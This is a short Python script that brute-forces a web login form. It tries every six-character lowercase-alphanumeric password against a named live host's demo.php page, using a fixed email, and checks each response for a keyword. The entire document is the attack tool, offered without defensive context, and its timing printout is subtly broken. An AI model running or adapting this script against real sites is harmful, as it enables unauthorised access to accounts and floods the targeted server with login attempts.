import requests
import itertools
import time
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
url = 'http://tqk.itps.com.vn/demo.php'
res = itertools.product(charset, repeat=6)
start_time = time.time()
for i in res:
    password = ''.join(i)
    payload = {'email':'test@demo.brute', 'password':password}
    req = requests.post(url, data=payload)
    print('Trying password: ', password)
    if('talent' in req.text):
        print('Password found:', password)
        print('\nTaken %s seconds to crack very easy password' %time.time() - start_time)
    else:
        print('Failed.....')